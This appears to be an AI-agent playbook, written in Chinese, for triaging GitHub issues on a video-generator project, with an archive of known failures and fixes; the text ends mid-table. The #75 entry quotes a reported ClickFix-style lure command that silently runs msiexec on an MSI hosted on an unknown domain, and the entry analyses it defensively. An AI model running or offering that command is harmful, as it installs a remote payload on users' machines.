# Issue 处理流程（初版）

> 面向对象：维护 / 开发本项目的 AI Agent
> 目标仓库：`lcy362/agnes-video-generator`
> 状态：🟢 初版可用，后续持续迭代
> 版本：v0.10 | 更新日期：2026-10-14

***

## 一、整体流程

```
查看新 Issue → 分析原因 → 与用户沟通 → 回复(标注 agent) 或 优化代码 → 周期整理 FAQ
```

## 二、详细步骤

### 1. 查看未处理的新 Issue

```bash
gh issue list --repo lcy362/agnes-video-generator --state open \
  --json number,title,createdAt,state,labels,comments
```

* 优先处理 **最近新增且未处理** 的 open issue。

* 读取 issue 正文与评论（`gh issue view <号码> --json body,comments`）。

* 初判类型：

  * **真实 Bug**：含错误信息 / 诊断数据 / 复现步骤。

  * **需求 / 建议**：功能请求、优化建议。

  * **垃圾 / 噪音**：灌水、广告、无实质内容。

### 2. 分析原因

* 结合 Issue 携带的诊断信息（v6.1 反馈自动带 `error_logs`、`/api/tasks/{id}/diagnostics`）与代码定位根因。

* 明确区分三类根因：

  | 类别     | 示例                       | 处理方向         |
  | ------ | ------------------------ | ------------ |
  | 应用 Bug | 逻辑错误、异常未捕获               | 优化代码         |
  | 外部故障   | 上游 ApiHub 偶发、DNS/网络、模型超时 | 回复说明 + 给应对建议 |
  | 使用问题   | 配置错误、域名/模型选择             | 回复引导         |

### 3. 与用户沟通

* **信息不足**：先在 Issue 上提问 / 请求补充必要信息（复现步骤、环境、日志）。

* **信息充分**：直接进入处理，无需额外沟通。

* 使用工具沟通时，涉及需要用户决策的选项用 `AskUserQuestion` 收敛。

### 4. 处理（二选一 / 或按情况组合）

* **优化代码**：确定为应用 Bug 时，按 `AGENTS.md` 的 `BugFix 工作流` 修复（定位 → 修复 → 自验 → 汇报），并更新回归测试。

* **回复用户**：外部故障 / 使用问题 / 已修复时，在 Issue 下回复结论与建议。

  * **必须标注具体实施的 Agent**（例如：`由 TraeWork 回复`），让用户与后续运维可知由谁处理。

  * 说明根因、是否需用户操作、以及可选的应对方式（如切换域名 / 模型 / 网络）。

* **垃圾噪音**：直接关闭（`gh issue close <号码>`），不展开回复。

#### 4.1 回复语言判定（回复须与用户语言一致）

**先判断该 Issue 是否使用了项目的问题反馈模板**（v6.1 反馈区预填）。判定模板特征（结构已多语言化，中英文体均出现）：正文含二级/三级小标题如 `## 诊断信息（…）` 或 `## Diagnostic Info (…)`，及 `### 复现步骤` / `### Reproduction Steps`、`### 期望行为` / `### Expected Behavior`、`#### 模型调用错误 N` / `#### Model call error N`，或多个 `模型调用错误`（`Model call error`）分组条目。

关于模板的多语言现状（代码核查 + v0.3 多语言化后的结论）：

* **前端界面文案**（`fb*` 键）与**报告/标题结构字段**（`fbRep*` 键）均走 i18n，已覆盖全部 22 种语言，`python scripts/i18n_check.py` 通过（缺一不可的是 zh 与 en）。结构字段位置：`frontend/src/utils/feedback.ts`（`buildDiagnosticReport` / `buildIssueTitle` / 截断文案）、`frontend/src/components/FeedbackPanel.vue`（`#### 模型调用错误 N` 等）。

* **具体报错文本**（`errorMessage`、`error_logs` 中的 API 错误原文、DNS 报错、ComfyUI 500 等）是**数据，不属于多语言**，不得作为语言判据。

* **v7.0 起报告新增「界面语言 / UI Language」行**（`fbRepUiLang` 键，由 `frontend/src/utils/feedback.ts::buildDiagnosticReport` 写入，取值来自 `frontend/src/api/langHeader.ts::getUiLang()`）。该行是**用户 UI 语言的最强指示**，优先级高于模板结构字段语言。维护者据此可直接判定回复语种，无需再从结构字段反推。

* **v7.0 起后端用户可见消息按 UI 语言返回**（`core/i18n_backend.py` + `web/middleware.py::LangContextMiddleware`，详见 `docs/plans/v7.0/backend_i18n_plan.md`）。此前 `utils/network.py::describe_network_error`、`API_KEY_MISSING_MSG`、任务排队/中断提示等是硬编码中文，英文界面用户也照看不误（issue #64 的真实成因）。修复后：
  - 前端在所有 `fetch` 上注入 `X-Agnes-UI-Lang` 头（全局 patch，`frontend/src/api/fetchPatch.ts`）；
  - 任务创建时把语言快照落盘到 `BaseTaskState.ui_language`，异步 Pipeline 全生命周期用它发消息；
  - **因此 `errorMessage` 里出现中文不再等于「用户是中文界面」**——v7.0 之前创建的旧任务、或用户中途切了语言但任务已落盘旧快照时，仍可能出现语种与界面不一致。判定时以报告的「界面语言」行为准，`errorMessage` 语种仅作参考。

**据此分两种情况判定用户语言：**

* **情况 A：用户采用了反馈模板**。

  * **首选信号（v7.0 起）：报告里的「界面语言 / UI Language」行**。该行由前端直接写入用户当前 UI 语言代码（如 `en` / `zh` / `ja`），是最强指示，无需推断。

  * **次选信号：模板结构字段语言**。多语言化后结构随用户界面语言变化（如 `## Diagnostic Info (Agnes Video Generator)` 表明英文界面、`## 诊断信息（Agnes Video Generator）` 表明中文界面）。当报告缺「界面语言」行（v7.0 之前的旧版本）时以此为准。**⚠️ 但结构字段语言不可单独采信**：部分语言包把 `fbRep*` 键的值直接复制了英文未译（v6.4.7 / v7.0 的 `ar.json` 即如此，`fbRepTitle` / `fbRepConfigs` / `fbRetryBtn` 全为英文，而 `tiWidth` 等内容键是真阿语），此时英文结构 ≠ 英文界面（issue #65 实为阿语界面）。必须用 Key Configs 条目里来自 `ti*` 等**真翻译键**的内容标签交叉验证——这类键通常已本地化，其语言才是界面语言的可靠证据；两者冲突时以内容标签语言为准。

  * **辅助信号**：用户在 `### 复现步骤` / `### 期望行为` 中填写的真实内容、正文 / 评论追加描述。

  * ⚠️ **`errorMessage` 里的中文不能作为「用户是中文界面」的证据**：v7.0 之前后端消息硬编码中文（issue #64），英文界面用户也会收到中文诊断。判定语种只看上面三个信号，报错文本一律当数据。

  * 若用户自行填写的字段皆空、仅剩结构与报错 → 以「界面语言」行（或结构语言）为准回复，并在开头补一句「如你需要，我可以改用英文 / 中文回复」（或按用户其余行为推断）。

* **情况 B：用户自行反馈（未用模板、或自由书写）** → 直接以用户正文 / 评论输入的语言作为实际语言回复。

> 例外：Issue 正文或评论若为纯广告 / 灌水（垃圾噪音），不适用语言规则，按第 4 节直接关闭。

#### 4.2 回复行文规范（简短，不讲逻辑）

面向用户的回复**只写结论与操作**，不写内部机制。硬约束：

* **推测直接说**：一句话说清「我们怀疑是什么」+「最可能的两三种成因」，并明确请用户确认，不铺陈推理链。
* **不向用户讲代码逻辑**：不出现文件路径、函数名、行号、调用链、异常继承关系、重试预算算法等实现细节（诊断数据里已有的报错原文可原样引用，但不解释其成因链）。
* **不确定就问**：把需要用户提供的信息列成**可复制执行的命令或具体问题**（如打印文件大小与前若干字节、能否用图片查看器打开、文件来源与原始文件名），一次问全，避免多轮拉扯。
* **先给解法**：即使用户还没回信息，也要给出当下可用的出路（换文件重建任务 / 关闭该功能走替代路径）。
* **可消耗的资源和进度要说清**：是否产生费用、是否已生成内容、重试是否有效——用户最关心，一句话即可。
* **承诺**：若用户反馈与推测相反（即确为应用 bug），说明会修复，避免用户觉得被推诿。

内部机制、根因链、代码位置、待办缺口一律写进本文件 §三 归档表，**不进 issue 回复**。

### 5. 定期整理常见问题 → 完善官网 FAQ

* 每次处理后，把**有复用价值的常见问题**沉淀到归档列表（见下节）。

* **周期性**（建议按版本或每月）将累积问题整理进官网 FAQ：

  * 中文：`docs/public/faq.zh.md`；英文：`docs/public/faq.md`（英文为原始正文，中文文件为中文版）。
    > 修订（2026-10-15）：原映射写反（原写「中文 `faq.md` / 英文 `faq.zh.md`」），实际 `faq.md` 为英文、`faq.zh.md` 为中文。

  * 遵守多语言规范，FAQ 文案不得硬编码。

* 同类问题重复出现 = FAQ 缺失或应对不当的信号，优先补齐。

***

## 三、常见问题归档（滚动维护）

> 处理每一条 Issue 后，如属可复现或有代表性，追加到本表；达到一定规模或到周期时统一写入官网 FAQ。

| 现象                                                                                                                                                                      | 根因                                                                                                            | 应对                                                                                                         | 关联 Issue |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- | -------- |
| （示例）视频生成报 `ComfyUI inference timeout` / 连接 `apihub.agnes-ai.cn` 失败                                                                                                      | 上游偶发超时 + 域名间歇不可达                                                                                              | 稍后重试；切换域名 cn/com；更换视频模型                                                                                    | #31      |
| 视频提交报 `HTTP 403 insufficient_user_quota`（预扣费额度不足）                                                                                                                       | 上游 Agnes 账户余额 < 本次视频预扣金额                                                                                      | 充值/增加账户额度后重试；缩短时长/降低分辨率降低单次成本；不需要可删除任务                                                                     | #34      |
| （待确认）Windows 下 `scene_prompts` 步骤报 `[WinError 2] The system cannot find the file specified`                                                                             | 该步骤仅 LLM 调用，疑为环境问题：SSL CA/证书包缺失、SSL DLL 缺失，或 HTTP(S)\_PROXY / REQUESTS\_CA\_BUNDLE / SSL\_CERT\_FILE 指向不存在的路径 | 待用户补充完整 traceback 与部署方式、环境变量后定位                                                                            | #35      |
| 国内站域名应为 `api.agnes-ai.cn` 而非 `apihub.agnes-ai.cn`                                                                                                                       | Agnes 官方域名划分：国内站（中国站）= `api.agnes-ai.cn/v1`，`apihub.agnes-ai.cn` 仅作国际站备用（实测两者同一 IP、均可访问）                      | `core/config.py` `AGNES_DOMAIN_MAP["cn"]` 已改为 `api.agnes-ai.cn` + 前端域名选择区同步更新（v6.x）                        | #37      |
| 请求报 `HTTP 401` / `无效的令牌`（含 `api.agnes-ai.cn/v1`、simple/manuscript 提交、creative `scene_config` 编剧 LLM 调用等） | API Key 与请求域名不匹配：跨站 key（国际站 key 用国内站专属域名 `api.agnes-ai.cn`，或反之）认证失败；亦可能 key 过期/抄写不完整（含首尾空格） | 升级 v6.4.2：per-key 域名绑定 + 「自动探测域名」按钮逐 key 补全匹配域名；国际站 key 用 `apihub.agnes-ai.com` 或 `cn_bak` 兜底（兼容国内/国际 key）。注意：**env/`.env` 来源的 key 不参与探测**（无法持久化域名，只走全局默认域名），需在 Web 配置页添加 key 或将全局默认域名切到与 key 站点一致。**`AGNES_API_KEY` 系统环境变量优先级高于 `.env`**（`core/config.py::_collect_env_keys`），设过环境变量的人改 `.env` 完全不生效，这是「换了两把 key 都不行」的常见真因。Docker 用户注意：改 `.env` 后须 `docker compose up -d --force-recreate` 重建容器（`restart` 不重读 `.env`）。自查口径：`GET {root}/v1/models` 带 Bearer key，200 的域名即该 key 的匹配站点（与 `_probe_domain` 同一条请求），三站全 401 = key 本身失效/抄错。**若同时存在 env key 与 Web key 会一起轮换**，一把不匹配就间歇性 401，排查期建议只留一把 | #38, #44, #58, #61, #62, #72, #73, #74(discussion) |
| 生成参考图后下载报 `platform-outputs.agnes-ai.space` SSL 中断（`SSLEOFError: UNEXPECTED_EOF_WHILE_READING`）或 DNS 失败（`Errno 11001 getaddrinfo failed`），creative/manuscript init 环节失败 | 上游图片文件服务域名 `platform-outputs.agnes-ai.space` 偶发不可达 / 本机 DNS、代理、VPN 或防火墙拦截                                     | 稍后重试；刷新 DNS / 换 DNS（如 223.5.5.5）；检查代理与防火墙；应用内置 3 次下载重试（间隔 3s）                                              | #45, #46 |
| creative 跑到最后才失败，视频下载环节报 `socket.gaierror [Errno 11004] getaddrinfo failed` 解析不了 `cos-platform-outputs.agnes-ai.cn`；反馈里「失败环节」却显示 `scene_config` | 本机 DNS / 代理 / 安全软件解析不到视频输出域名（腾讯云 COS）。实测 issue 里的 mp4 URL 返回 HTTP 206、文件完整，服务端已生成成功。环节名失真是另一回事：反馈面板取页面挂载时的 `current_step` 快照，且终态进度写入被 0.5s 节流丢弃 | 换能解析该域名的 DNS（223.5.5.5 / 119.29.29.29）、关 VPN/代理 DNS 劫持与 hosts/安全软件拦截、`ipconfig /flushdns` 后点「重试任务」续传（video id 已保留，不重复提交）；v6.4.8 已修：网络类异常翻译为「网络诊断」提示、失败终态强制落盘并保留真实环节、报告改用实时环节名 | #56, #57 |
| 视频提交持续报 `HTTP 503 server error` → `max retries (5) exceeded`，或 `HTTP 429 rate limited`，随后轮询返回 `job cancelled`                                                           | 上游视频服务过载 / 限流，提交重试耗尽且任务被上游取消                                                                                  | 错峰稍后重试；降低并发生成以减少限流；必要时更换视频模型 / 域名                                                                          | #47      |
| 视频提交返回 `{"code":"video_queue_full","message":"video queue is full, please retry later"}`，错误面板直接显示这段原始 JSON                                                                                                              | 上游视频服务队列饱和（与 #47 的 503 / 429 同族容量问题），请求在入队前就被拒。应用当前的自动重试只覆盖 HTTP 429 与 5xx（`core/api/agnes_video.py`），该业务错误码不在其中，因此立即硬失败；前端 `feedback.ts` 的 `HTTP 40[0-4]` 预筛还会把它误判为「确定性故障」，给出「重试无效」的错误引导 | 等几分钟错峰重试；长任务点「重试任务」续传（已生成片段保留 video id，不重复提交）；降时长/分辨率或换视频模型；多 Key 可线性提升配额，或用 `AGNES_VIDEO_RATE_LIMIT` 主动放慢提交；持续失败再附 `GET /api/tasks/{id}/diagnostics` 反馈。**已记录为已知缺口**（瞬态业务码应纳入退避重试 + 前端不应归类为确定性故障），本轮按外部故障处理，未改代码 | #63      |
| Issue 正文只有一段视频提示词（无报错、无环境、无复现步骤，标题多为乱码或 "first"），期望维护者代跑生成                                                                                             | 用户把开源仓库的 Issue 当成在线生成入口；本项目是**自托管工具**，服务端不代用户执行任务                                                | 按垃圾噪音关闭（`--reason "not planned"`，不展开回复）；已补 FAQ 双语条目「贴提示词到 Issue 能生成视频吗」+ `.github/ISSUE_TEMPLATE/config.yml` 的 contact_links 指向本地部署与官网在线体验 | #39, #41, #48, #51, #52, #67 |
| 桌面版长视频（creative/manuscript）里角色不开口说话，只有一段旁白；而网页在线版能看到角色原声 | 流水线默认跑 TTS 旁白（narration）+ 字幕叠加，`concat_videos_with_audio_overlay` 用旁白/静音轨覆盖并替换掉视频模型自带音频 | 关闭「启用旁白配音」（Audio → Enable narration=off），并尽量同时关字幕，让每个片段保留模型生成音；在视频提示词里直接描述角色说话（"the character says, '…'"）驱动模型自带口型与声音。注意：Agnes 视频模型自带音频质量/口型弱于画面，长多场景视频尤甚，属模型限制；要清晰台词仍用 TTS 旁白更稳 | #58 |
| manuscript 任务在 `video_gen` 失败，`errorMessage` 是一段中文「网络诊断：本机无法连接到 …（连接被拒绝或被拦截）」，但报告结构字段（`## Diagnostic Info` / `### Reproduction Steps`）是英文，用户实为英文界面 | 两层原因：(1) 本机到 Agnes 视频域名的 TLS 握手被对端 reset（`ConnectionResetError: [Errno 54] Connection reset by peer`），属本地网络/代理/防火墙拦截，非服务侧故障；(2) 后端 `utils/network.py::describe_network_error` 此前硬编码中文，英文 UI 用户也收到中文诊断，看不懂又误判为服务 bug | 网络侧：关代理/VPN 后重试、换直连或热点验证、把 `*.agnes-ai.cn` 加白，恢复后点「重试任务」从 `video_gen` 续传（已生成分镜不重跑）。代码侧：v7.0 已修——新增 `core/i18n_backend.py` + `LangContextMiddleware`，前端全局注入 `X-Agnes-UI-Lang`，任务落盘 `ui_language` 快照，`describe_network_error` / `API_KEY_MISSING_MSG` / 排队/中断/模式切换等消息按 UI 语言返回中英双语；`_CONNECT_MARKERS` 补 `connection reset` 让归因更稳；诊断报告新增「界面语言」行。剩余进度/校验消息已于 2026-09-24 收尾批次全部清除（见 `docs/plans/v7.0/backend_i18n_plan.md` §三） | #64 |
| creative 任务在 `scene_config` 失败（v6.4.7），`errorMessage` 为中文「图片分析失败（Start Frame）: … SSLError … certificate is not yet valid」，请求 `apihub.agnes-ai.com/v1/chat/completions` 多次重试均败 | 客户端证书时间校验失败：`apihub.agnes-ai.com` 证书当日刚轮换（notBefore=2026-09-23 10:35 UTC），用户 Windows 时钟落后/时区错或 HTTPS 拦截类安全软件给出无效日期证书，即报 `CERTIFICATE_VERIFY_FAILED: not yet valid`。失败发生在 Start Frame 图片多模态分析（`core/screenwriter/__init__.py::_describe_with_retry`），视频未提交、无消耗。另注：该中文前缀是后端硬编码消息（v7.0 未覆盖，属 §三 剩余消息），且报告结构字段为英文而用户实为阿语界面（`ar.json` 的 `fbRep*` 值未译），印证 §4.1 语言判定新陷阱 | 引导：开启系统时间自动同步（`w32tm /resync`）+ 校准时区；关代理/VPN/杀软 HTTPS 扫描或加白 `*.agnes-ai.*`；恢复后点 Retry Task 从失败步骤续传。已按环境故障阿语+英语双语回复（标注 agent）。代码侧：`_describe_with_retry` 的「图片分析失败」等 screenwriter 消息与其余 ~120 条后端硬编码中文已于 2026-09-24 收尾批次全部纳入 backend i18n（见 `docs/plans/v7.0/backend_i18n_plan.md` §三）；仍待办：`ar.json` 等语言包 `fbRep*` 需真正翻译（i18n_check 只查键存在，查不出英文占位值） | #65 |
| manuscript 任务 `scene_prompts` 失败，App 7.0.0 / **UI Language: en**，`errorMessage` 却是中文「稿件场景描述生成全部失败 48 段…原因: 401 Client Error: Unauthorized」（48 段 LLM 调用全部 401） | 两层：(1) **401 本体**＝Key 未通过认证，属既有关联条目同族（跨站 Key 与域名不匹配：国际站域名 `apihub.agnes-ai.com` 配国内站 Key 或反之；env/`.env` 来源 Key 不参与 per-key 域名绑定只走全局默认域名；Key 过期/抄写不完整），任务未产出、无消耗；(2) **中文消息**＝v7.0.0 该消息仍硬编码中文（P1 收尾批次修复项），随 v7.0.1 发布——本条即 §4.1 新机制的首个实战验证：报告「界面语言」行（v7.0.0 起有）为判定依据，中文 `errorMessage` 仅作数据，据此以**英文**回复 | 引导：升级到 v7.0.1（同错误在英文界面渲染为 "All 48 manuscript scene descriptions failed…"）；Web 配置页重加 Key 用「自动探测域名」或把全局默认域名切到与 Key 站点一致；恢复后 Retry Task 从 `scene_prompts` 续传。已英文回复（标注 agent）。顺带修正：仓库内 GHCR 嵌套路径 `ghcr.io/lcy362/agnes-video-generator/free-short-video` 从未存在（registry 403），已全部改为实际平铺路径 `ghcr.io/lcy362/free-short-video`（GitHub Release body 由 CI 模板生成、本就正确） | #66 |
| creative 任务在 `audio` 失败（v6.5.0 / Windows），`errorMessage` 仅 `[WinError 2] The system cannot find the file specified`，报告结构为英文但 Key Configs 的 Style 值是中文「电影质感写实风格」 | **应用 Bug（待修）**：`core/audio/tts.py` SilentTTSEngine 用裸 `"ffmpeg"` 经 `asyncio.create_subprocess_exec` 起子进程，未走 `core/compositor/ffmpeg_tool.resolve_ffmpeg()` 统一解析（该机制 v6.4.1 为修 #36 而建，TTS 这条漏网）。Windows 无系统 ffmpeg 时 CreateProcess 抛 [WinError 2]。触发：关旁白（Silent 落盘）或 EdgeTTS 失败降级。同族待修共 7 处：`tts.py:175`（崩溃点）＋ 4 处裸 `"ffprobe"` 探测（`pipelines/__init__.py:526` get_audio_duration、`poetry_video.py:362/380`、`watermark.py:66`，失败静默降级 0.0/None/False）＋ 2 处裸 `"ffmpeg"`（`creative/steps_video.py:361/470` last-frame 提取与尾帧归一化，同样会崩） | 引导装 ffmpeg（`winget install Gyan.FFmpeg` 或官网下载加 PATH）后「重试任务」续传；**代码侧已于 2026-09-29 修复**：7 处全部收口——新增 `ffmpeg_tool.resolve_cmd_binary()`（把命令首元素裸 `ffmpeg`/`ffprobe` 换成解析后绝对路径，解析不到抛 i18n 文案 `error.ffmpeg_missing`）＋ `probe_duration()` / `has_audio_stream()` / `probe_video_dimensions()`（均为 **ffprobe → ffmpeg stderr 兜底 → default**，`ffprobe` 缺失不再静默降级），`_run_ffmpeg_async` 与 `BasePipeline.run_ffmpeg_async` 接前者，`tts.py` 崩溃点无二进制时抛中英双语错误。**语言判定教训（§4.1 新变体）**：v6.5.0 时代全部 20 个非中英语言包 `fbRep*` 均为英文占位（结构语言无法区分 en 与其余 19 种），zh 包当时已是完整中文——「英文结构」直接排除 zh 界面；而中文表单值（styleDefault 等输入框内容）来源不可靠（手输/早前会话残留/建任务后切语言），不得反向当作 zh 界面证据。本条以英文回复 | #78 |
| simple 任务 i2v 提交即失败（v6.4.7），`HTTP 403 insufficient_user_quota`（"remaining: ＄0.000000"），traceback 显示走 `_submit_video_v25`（Video 2.5 Flash） | 上游模型已形成免费/付费分层：2.5 Flash 为**付费模型**、按账户余额扣费，余额 $0 在提交时即被拒；与提示词/参数无关。#34 同族的新变体：当时归因「预扣费额度不足」，本轮明确为「选了付费模型＋余额为零」，引导方式从「充值」改为「换免费模型」 | 引导在任务设置里把视频模型切到免费档 `agnes-video-v2.0` 重新提交（无需充值）；确需 2.5 Flash 再充值。英文回复（结构语言判定，无冲突内容键） | #79 |
| #75（demo 超时议题）新评论：用户称在 `video.lichuanyang.top/es/demo` 被要求以「验证」为名运行 `msiexec /i http://bicyclyn16.top/... /qn`（静默安装陌生域 MSI，ClickFix 假验证特征） | 站点代码排查干净（线上 HTML 无注入脚本/iframe，demo 无「运行命令」逻辑），非站点被入侵。两个并列假设：**A**＝页面第三方广告创意（页面实证挂载 Adsterra Social Bar＋AdSense，创意由广告网络动态决定、站方不可审计）；**B**＝用户本地环境（恶意扩展/流氓根证书 MITM；纯 DNS 劫持在 HTTPS 下会证书报错，概率低）。仅一例报告，无法定论。注意：popunder 2026-07-08 移除属广告体验原因，与恶意内容无关，不可作佐证 | 按平铺口径英文回复：确认「不正常」＋demo 从不要求运行命令＋A/B 两假设并列（不用「恶意」措辞，A 表述为「可能是广告行为」）＋承诺向广告服务商求证＋留区分性问题（页面内弹层 vs 独立弹窗）。**待办（维护者）**：向 Adsterra/AdSense 后台询问是否有「验证」类创意；若多用户报告同现象且集中于挂广告页面→处理广告位；FAQ 可补「官网/demo 绝不要求运行命令」条目 | #75 |
| creative 任务在 `video_gen` 失败（7.0.0 / 6.4.5 / Windows），`errorMessage` 为 `[AgnesVideo] reference (2 images, keyframe fallback): max retries (5) exceeded`；#81 附完整 traceback 与 8 条 `Model call error`，**全部为 `HTTP 503` 且 body 无 `code`** | 上游视频服务过载/队列饱和，属#47/#63 同族的**新变体：裸 503**。`core/api/agnes_video.py::_submit_with_retry` 的 v7.0 U1 队列轨道只在 body `code` 命中 `_QUEUE_FULL_CODES`（`video_queue_full` / `fail_to_fetch_task`）时启用；**body 无 code 的裸 503 落入普通 `>= 500` 分支**，只享 5 次退避（`retry_base_delay=30` → 30/60/90/120/150s ≈ 5.5 分钟）。#81 时间戳（20:09:08→20:09:38→20:10:39→20:12:09→20:14:10→20:16:40，间隔 30/60/90/120/150s）精确吻合该序列，证实走的是普通配额而非队列轨道。而 `docs/dev/agnes_video_upstream_behavior.md` §4 实测队列饱和**可持续 12 分钟以上**——即应用会在「再等一分钟就能排上」时提前放弃。被拒不创建任务、不消耗配额，可安全重试。另注：#81 标题「Failed Step: scene_config」与 traceback 实际 `video_gen` 不符，是反馈面板环节名失真老问题（#56/#57 同族，v6.4.8 已部分修），本例 traceback 更可信 | 引导：错峰重试（免费队列高峰为欧美与亚洲工作时段）；点「重试任务」从失败步骤续传（已生成场景保留，不重复提交）；降时长/分辨率减少单次占用；换视频模型（队列按模型分池）；多 Key 提升配额。已英文回复 #80/#81/#83（标注 agent）。**代码侧本轮按外部故障处理，未改代码——已记录为待办缺口：裸 503 应比照队列满纳入长预算轨道（`AGNES_VIDEO_QUEUE_RETRY_SECONDS`，默认 900s），而非 5 次普通配额** | #80, #81, #83 |
| creative 任务在 `story` 失败（7.0.5 / npx 部署 / Windows），`errorMessage` 为 `401 Client Error: Unauthorized for url: https://api.agnes-ai.cn/v1/chat/completions`，报告 **UI Language: en** | 既有 401 同族（#38/#44/#58/#61/#62/#72/#73）的**npx 部署新变体**：请求打到国内站域名 `api.agnes-ai.cn`（`AGNES_DOMAIN_MAP["cn"]`）而被拒，即 Key 与域名不匹配（国际站 Key 配国内站域名或反之）。**npx 特有的放大因素**：`core/config.py` 的 `CONFIG_DIR` 硬编码为包目录内 `.agnes_config`（`os.path.dirname(os.path.dirname(__file__))`），npx 场景下包解包在 `AppData\Local\npm-cache\_npx\<hash>\node_modules\free-short-video\`，**配置与 Key 落在 npm 缓存里**——`npm cache clean` 或 npm 换了缓存目录（hash 变化）即丢配置并回退默认域名（`_DEFAULT_DOMAIN = "com"`），用户可能在无感知情况下回到错误域名。env 变量优先级高于 `.env`（`_collect_env_keys`）的老问题依旧适用 | 引导：Web 配置页删掉旧 Key 后用「自动探测域名」逐 key 绑定（200 的域名即匹配站点，三站全 401 = Key 本身失效/抄写带头尾空格）；自查 `GET {root}/v1/models` 带 Bearer；排查 `AGNES_API_KEY` 系统环境变量（优先级最高，设过则 Web 配置不生效）；排查期只留一把 Key（多 Key 会一起轮换，一把不匹配即间歇 401）；恢复后 Retry Task 从 `story` 续传。已英文回复（UI Language: en 判定；Style 值中文不作为语言依据）。回复中额外提示 npx 配置随 npm 缓存丢失的风险。**潜在改进（未落代码）**：`CONFIG_DIR` 支持环境变量覆盖 / npx 场景改用用户级配置目录，可列入 v7.1 待办 | #82 |
| creative 任务在 `video_gen` 失败（**7.0.1** / Windows），`errorMessage` 为 `[AgnesVideo] reference (2 images, keyframe fallback): max retries (5) exceeded`；报告 **UI Language: en**，11 场景 / 1152×768 / keyframes，`Retry Count: 2`，18 条 `Model call error` **全部为 `HTTP 503` 且 body 无 `code`**（22:10:24→22:11:26→22:12:27→22:13:58→22:15:58，间隔 62/61/91/120s），并出现 3 次 `RetriesExhausted`（原始 + 用户两次手动重试，每次重开约 5.5 分钟配额） | 与 #80/#81/#83 **同一条已记录缺口**（裸 503 落入普通 `>= 500` 分支，仅 5 次退避 ≈5.5 分钟；实测队列饱和可持续 12 分钟以上），本轮仍按外部故障处理。用户版本 7.0.1 已含 v7.0 U1 队列轨道，但该轨道只在 body `code` ∈ `_QUEUE_FULL_CODES` 时启用，**裸 503 不受益**——即「升级到 7.0」不足以覆盖本例，回复中未再承诺升级可解 | 英文回复（UI Language: en）：确认上游容量问题＋未创建任务/未消耗配额＋设置有效；显式说明「裸 503 走标准 5 次预算、约 5.5 分钟即放弃，属已知缺口、正在跟踪」；引导错峰重试、Retry Task 续传、降载（更少场景/更短时长/更小分辨率）、换视频模型、多 Key。**代码侧仍未改**：裸 503 应比照队列满纳入长预算轨道（`AGNES_VIDEO_QUEUE_RETRY_SECONDS`，默认 900s）——待办缺口持续累积（#80/#81/#83/#84 已 4 例） | #84 |
| creative 任务在 `video_gen` 失败（**7.0.5** / Windows），`errorMessage` 为 `Agnes video submit failed (HTTP 401): {"error":{"code":"","message":"Invalid token (request id: ...)","type":"AgnesAI_error"}}`；报告 **UI Language: en**，5 场景 / 768×1152 / keyframes，`Retry Count: 0`。同任务前序 `Model call error` 为**图片侧** `apihub.agnes-ai.com` 的 `ReadTimeout`(120s) + 2 次 `HTTP 503 server error` | 既有 401 同族（#38/#44/#58/#61/#62/#72/#73/#82）的**视频提交新变体**，且首次出现「同任务图片能过、视频 401」的混合指纹：**关键证据**是图片侧拿到的是 503/超时（服务繁忙，**认证已通过**），说明 Key 池中至少一把 Key 在国际站 `apihub.agnes-ai.com` 可用；紧接着的视频提交却 401。代码核查确认根因：`core/api/key_manager.py::KeyRing.next()` 对**所有已配置 Key 做 round-robin**，图片与视频共用同一 KeyRing；`core/config.py::get_base_url_for_key()` 对**未绑定域名的 Key（含 env / `.env` 来源，`_collect_env_keys` 优先级高于 `.env`）回退全局 `agnes_domain`**。因此在「池内含国内站 Key + 全局域名为国际站」时，国内站 Key 被发往国际站域名 → `Invalid token`，而另一把 Key 继续服务图片调用 → 正是本例「一次服务繁忙、下一次硬 401」的交错现象。另注：`_submit_with_retry` 对 **401 不做换 Key 重试**（仅 429 走 `ring.rotate()`），直接落入通用分支 `raise RuntimeError`（`agnes_video.py:794-805`），故一把坏 Key 即可打死健康任务 | 英文回复（UI Language: en）：401 = 请求所带 Key 未被该域名接受、未生成未消耗；解释两站独立 Key 空间 + env/.env Key 不参与 per-key 域名绑定 + round-robin 混池是「图片能过、视频 401」的成因。引导：排查期**只留一把 Key**；Web 配置页用「自动探测域名」重绑；排查 `AGNES_API_KEY`（优先级最高）；自查 `GET {root}/v1/models` 带 Bearer（200 即匹配站点，三站全 401 = Key 失效/带头尾空格）；修复后 Retry Task 从 `video_gen` 续传（分镜与已生成图片保留）。**方案调整并已实施（v7.1）**：经维护者决策，**不做** 401 换 Key 重试（要求「执行中不调整 Key 池」），改为**归因收口 + 用户自行处置**——① `core/api/key_manager.py` 新增 `mark_auth_failed()` / `auth_failures()` / `clear_auth_failures()`，在 KeyRing 内**只登记** 401 事实（count/status/domain/message/last_at），`next()`/`rotate()`/`_keys` 一律不读登记表（不剔除、不降权、不改轮转；池唯一写入口仍是 `set_api_keys`/`delete_api_key`），登记随 `reset_key_ring()` 与进程重启清零；② `core/api/agnes_video.py::_register_auth_failure()` 在 `_submit_with_retry` 通用分支与 `_upload_image_to_url` 的 `raise_for_status()` 前上报，**失败行为与错误文案保持原样**（不换 Key、不重试）；③ `GET /api/config/keys` 每项下发 `auth_failed`，前端配置页 Key 行显示红色「认证失败 ×N」角标（悬停含次数与时间），**是否移除该 Key 由用户自行决定**，用户不处理时仍照原逻辑报错。新增日志前缀 `[KeyAuth]` | #86 |
| creative 任务在 `video_gen` 失败（**7.0.5** / Windows / Opera），`errorMessage` 为 `Agnes video queue is full (HTTP 503 · video_queue_full); after retrying for 15 min the job never entered the queue, so nothing was generated (no quota used)…`；报告 **UI Language: en**，1280×720 / 7 场景 / keyframes，`Retry Count: 0` | 上游视频队列饱和，与 #47/#63 同族；但**本次 body 带 `video_queue_full` code**，命中 v7.0 U1 队列长预算轨道（`AGNES_VIDEO_QUEUE_RETRY_SECONDS` 默认 900s），因此**正确重试满 15 分钟**仍未入队后放弃——这是队列轨道**按设计工作**的正向对照，区别于 #80/#81/#83/#84 的**裸 503**（无 code、只走普通 `>=500` 分支、约 5.5 分钟即弃）。被拒发生在入队前，未创建任务、未消耗配额 | 英文回复（UI Language: en，标注 agent）：确认外部容量问题＋未生成未消耗＋错峰重试（免费队列高峰在欧美/亚洲工作时段）＋Retry Task 从 `video_gen` 